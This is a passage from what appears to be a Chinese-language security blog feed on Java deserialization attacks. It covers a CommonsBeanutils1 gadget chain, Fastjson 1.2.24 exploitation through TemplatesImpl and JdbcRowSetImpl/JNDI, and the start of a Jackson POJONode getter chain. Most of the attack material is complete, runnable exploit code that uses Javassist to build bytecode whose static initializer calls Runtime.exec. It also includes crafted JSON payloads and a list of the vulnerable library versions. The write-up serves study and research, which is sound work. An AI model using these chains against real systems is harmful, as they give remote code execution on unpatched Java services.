class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.demo;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Comparator;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonsBeanutils1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object</span><br><span class="hljs-params">            value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getFieldValue</span><span class="hljs-params">(Object obj, String fieldName)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> field.get(obj);<br>        <span class="hljs-keyword">return</span> value;<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//恶意Templates</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        pool.insertClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(AbstractTranslet.class));<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">cc</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;Cat&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;<br>        cc.makeClassInitializer().insertBefore(cmd);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">randomClassName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Calc&quot;</span> + System.nanoTime();<br>        cc.setName(randomClassName);<br>        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;cc.toBytecode()&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-literal">null</span>,(String.CASE_INSENSITIVE_ORDER);<br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>,beanComparator);<br>        priorityQueue.add(<span class="hljs-string">&quot;1&quot;</span>);<br>        priorityQueue.add(<span class="hljs-string">&quot;1&quot;</span>);<br>        setFieldValue(beanComparator, <span class="hljs-string">&quot;property&quot;</span>, <span class="hljs-string">&quot;outputProperties&quot;</span>); <span class="hljs-comment">//要调用的getter</span><br>        setFieldValue(priorityQueue, <span class="hljs-string">&quot;queue&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;obj, obj&#125;);<br><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;./CommonsBeanutils.ser&quot;</span>));<br>        outputStream.writeObject(priorityQueue);<br>        outputStream.close();<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;./CommonsBeanutils.ser&quot;</span>));<br>        inputStream.readObject();<br>        inputStream.close();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.28.0-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.shiro<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>shiro-spring<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.4<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p><a href="https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html">https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html</a></p>]]></content>
    
    
    <categories>
      
      <category>JAVA安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVA反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>FastJson利用链</title>
    <link href="/2024/09/02/FastJson%E5%88%A9%E7%94%A8%E9%93%BE/"/>
    <url>/2024/09/02/FastJson%E5%88%A9%E7%94%A8%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<h3 id="影响版本"><a class="markdownIt-Anchor" href="#影响版本"></a> 影响版本</h3><p>Fastjson：1.2.22-1.2.24</p><h3 id="利用条件"><a class="markdownIt-Anchor" href="#利用条件"></a> 利用条件</h3><p>jdk8，springboot项目+依赖如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.28.0-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.24<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>使用的是<code>JSON.parseObject(payload, Object.class, Feature.SupportNonPublicField)</code>这种格式的<code>parseObject</code></p><p>或则是<code>JSON.parse(payload,Feature.SupportNonPublicField);</code>这种格式</p><h3 id="利用方法"><a class="markdownIt-Anchor" href="#利用方法"></a> 利用方法</h3><h4 id="templatsimpl链"><a class="markdownIt-Anchor" href="#templatsimpl链"></a> TemplatsImpl链</h4><p>利用链</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-variable constant_">JSON</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:parseObject-&gt;DefaultJSONParser</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:parseObject-&gt;JavaObjectDeserializer</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:deserialze-&gt;DefaultJSONParser</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:parse-&gt;DefaultJSONParser</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:parseObject-&gt;JavaBeanDeserializer</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:deserialze-&gt;JavaBeanDeserializer</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:parseField-&gt;DefaultFieldDeserializer-&gt;parseField-&gt;FieldDeserializer-&gt;setValue-&gt;TemplatesImpl</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:getOutputProperties</span><br></code></pre></td></tr></table></figure><p>后面就是接TemplatsImpl利用链了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.demo;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> org.apache.commons.codec.binary.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">fastjsonTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        pool.insertClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(AbstractTranslet.class));<br>        CtClass cc=pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));<br>        CtConstructor ctConstructor=cc.makeClassInitializer();<br>        ctConstructor.insertBefore(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br>        <span class="hljs-type">byte</span>[] code=cc.toBytecode();<br>        String code_base64= Base64.encodeBase64String(code);<br>        <span class="hljs-keyword">final</span> String NASTY_CLASS=<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;<br>        String payload=<br>                <span class="hljs-string">&quot;&#123;\&quot;&quot;</span> +<br>                        <span class="hljs-string">&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS + <span class="hljs-string">&quot;\&quot;,&quot;</span> + <span class="hljs-string">&quot;\&quot;&quot;</span> +<br>                        <span class="hljs-string">&quot;_bytecodes\&quot;:[\&quot;&quot;</span> + code_base64 + <span class="hljs-string">&quot;\&quot;],&quot;</span> +<br>                        <span class="hljs-string">&quot;&#x27;_name&#x27;:&#x27;aaa&#x27;,&#x27;&quot;</span> +<br>                        <span class="hljs-string">&quot;_tfactory&#x27;:&#123; &#125;,\&quot;&quot;</span> +<br>                        <span class="hljs-string">&quot;_outputProperties\&quot;:&#123; &#125;,&quot;</span> + <span class="hljs-string">&quot;\&quot;&quot;</span> +<br>                        <span class="hljs-string">&quot;_version\&quot;:\&quot;1.0\&quot;,\&quot;&quot;</span> +<br>                        <span class="hljs-string">&quot;allowedProtocols\&quot;:\&quot;all\&quot;&#125;\n&quot;</span>;<br>        ParserConfig config=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ParserConfig</span>();<br>        Object obj= JSON.parseObject(payload,Object.class,config, Feature.SupportNonPublicField);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/akka1/p/16138460.html">https://www.cnblogs.com/akka1/p/16138460.html</a></p><h4 id="jdbcrowsetimpl链"><a class="markdownIt-Anchor" href="#jdbcrowsetimpl链"></a> JdbcRowSetImpl链</h4><p>这条链就是利用Fastjson反序列化导致<a href="/2024/09/24/JNDI%E6%B3%A8%E5%85%A5">JNDI注入</a>从而命令执行，需要能出网</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.demo;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JdbcRowSetImplTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">PoC</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;, \&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/RCE\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;<br>        JSON.parse(PoC);<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/weixin_43263451/article/details/125862793">https://blog.csdn.net/weixin_43263451/article/details/125862793</a></p><p>fastjson多种利用方式</p><p><a href="https://www.cnblogs.com/nice0e3/p/14776043.html">https://www.cnblogs.com/nice0e3/p/14776043.html</a></p>]]></content>
    
    
    <categories>
      
      <category>JAVA安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVA反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>POJONode调用任意类的getter方法</title>
    <link href="/2024/08/30/POJONode%E8%B0%83%E7%94%A8%E4%BB%BB%E6%84%8F%E7%B1%BB%E7%9A%84getter%E6%96%B9%E6%B3%95/"/>
    <url>/2024/08/30/POJONode%E8%B0%83%E7%94%A8%E4%BB%BB%E6%84%8F%E7%B1%BB%E7%9A%84getter%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h3 id="介绍"><a class="markdownIt-Anchor" href="#介绍"></a> 介绍</h3><p>POJONode是jackson库中的一个类，而jackson是一个用于处理 JSON 数据的 Java 库，广泛应用于 Spring Boot 中进行 JSON 序列化和反序列化，springboot本身就自带了jackson依赖，如果不是springboot就可能要自己添加jackson为依赖。</p><p>Spring Boot 的起始器（starter-web）依赖也会自动包含这个库。（复现这条链的时候就要用）</p><h3 id="利用链"><a class="markdownIt-Anchor" href="#利用链"></a> 利用链</h3><p><code>BadAttributeValueExpException.toString -&gt; POJONode.toString -&gt; jackson反序列化-&gt;getter </code></p><p><code>EventListenerList.toString -&gt; POJONode.toString-&gt; jackson反序列化-&gt;getter </code></p><p>要调用哪个对象的getter就把他传给POJONode</p><img src="/2024/08/30/POJONode%E8%B0%83%E7%94%A8%E4%BB%BB%E6%84%8F%E7%B1%BB%E7%9A%84getter%E6%96%B9%E6%B3%95/3.jpg" class=""><p>可以在前面加上其他链，使得其他链连接到这条链就可以利用了</p><p>在序列化时，要重写com.fasterxml.jackson.databind.node.BaseJsonNode：把里面的writeReplace注释掉，才能够序列化成功。</p><img src="/2024/08/30/POJONode%E8%B0%83%E7%94%A8%E4%BB%BB%E6%84%8F%E7%B1%BB%E7%9A%84getter%E6%96%B9%E6%B3%95/1.jpg" class=""><h4 id="分析"><a class="markdownIt-Anchor" href="#分析"></a> 分析</h4><p>JackSon序列化会触发getter，是由于jackSon中将对象序列化成一个json串主要是使用的<code>ObjectMapper#writeValueAsString</code>方法，</p><p>writeValueAsString会通过遍历的方法将bean对象中的所有的属性的getter方法进行调用。例子如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.demo;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getName&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getAge&quot;</span>);<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.demo;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectMapper</span> <span class="hljs-variable">mapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectMapper</span>();<br><br>        <span class="hljs-comment">// 创建一个 Person 对象并序列化为 JSON 字符串</span><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;fru1ts&quot;</span>,<span class="hljs-number">20</span>);<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">jsonString</span> <span class="hljs-operator">=</span> mapper.writeValueAsString(person);<br>        System.out.println(<span class="hljs-string">&quot;Serialized JSON: &quot;</span> + jsonString);<br>    &#125;<br>&#125;<br><br><br><span class="hljs-comment">//getName</span><br><span class="hljs-comment">//getAge</span><br><span class="hljs-comment">//Serialized JSON: &#123;&quot;name&quot;:&quot;fru1ts&quot;,&quot;age&quot;:20&#125;</span><br></code></pre></td></tr></table></figure><p>而POJOnode继承自ValueNode，ValueNode继承自BaseJsonNode，BaseJsonNode的toString为</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">toString</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">InternalNodeMapper</span>.<span class="hljs-title function_">nodeToString</span>(<span class="hljs-variable language_">this</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>跟进nodeToString</p><img src="/2024/08/30/POJONode%E8%B0%83%E7%94%A8%E4%BB%BB%E6%84%8F%E7%B1%BB%E7%9A%84getter%E6%96%B9%E6%B3%95/2.jpg" class=""><p>会调用ObjectWriter的writeValueAsString，而ObjectWriter的writeValueAsString和ObjectMapper的writeValueAsString功能是一样的，所以能够触发任意getter。</p><h5 id="badattributevalueexpexception触发tostring"><a class="markdownIt-Anchor" href="#badattributevalueexpexception触发tostring"></a> BadAttributeValueExpException触发toString</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>    setFieldValue(exp,<span class="hljs-string">&quot;val&quot;</span>, jsonNodes);<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String field, Object arg)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(field);<br>    f.setAccessible(<span class="hljs-literal">true</span>);<br>    f.set(obj, arg);<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="eventlistenerlist触发tostring"><a class="markdownIt-Anchor" href="#eventlistenerlist触发tostring"></a> EventListenerList触发toString</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">EventListenerList</span> <span class="hljs-variable">eventListenerList</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EventListenerList</span>();<br>      <span class="hljs-type">UndoManager</span> <span class="hljs-variable">undoManager</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UndoManager</span>();<br>      <span class="hljs-type">Vector</span> <span class="hljs-variable">vector</span> <span class="hljs-operator">=</span> (Vector) getFieldValue(undoManager, <span class="hljs-string">&quot;edits&quot;</span>);<br>      vector.add(jsonNodes);<br>      setFieldValue(eventListenerList, <span class="hljs-string">&quot;listenerList&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;InternalError.class, undoManager&#125;);<br><br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getFieldValue</span><span class="hljs-params">(Object obj, String field)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>      <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> obj.getClass().getSuperclass().getDeclaredField(field);<br>      f.setAccessible(<span class="hljs-literal">true</span>);<br>      <span class="hljs-keyword">return</span>  f.get(obj);<br>  &#125;<br></code></pre></td></tr></table></figure><h3 id="低版本jdk8"><a class="markdownIt-Anchor" href="#低版本jdk8"></a> 低版本（jdk8）</h3><p>低版本的<code>com.sun.*</code>包可以直接调用，高版本<code>com.sun.*</code>包是没有暴露出来的。</p><p>低版本<code>BadAttributeValueExpException</code>的<code>val</code>类似是<code>Object</code>，而高版本限制为<code>String</code>导致不能利用。</p><p>低版本<code>_factory</code>的属性值可以是null，而高版本<code>_factory</code>的属性值不能是null</p><h4 id="templatesimpl链"><a class="markdownIt-Anchor" href="#templatesimpl链"></a> TemplatesImpl链</h4><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-title class_">POJONode</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:toString-&gt;InternalNodeMapper</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:nodeToString-&gt;ObjectWriter</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:writeValueAsString-&gt;ObjectWriter</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:_writeValueAndClose-&gt;ObjectWriter</span><span class="hljs-symbol">:</span><span 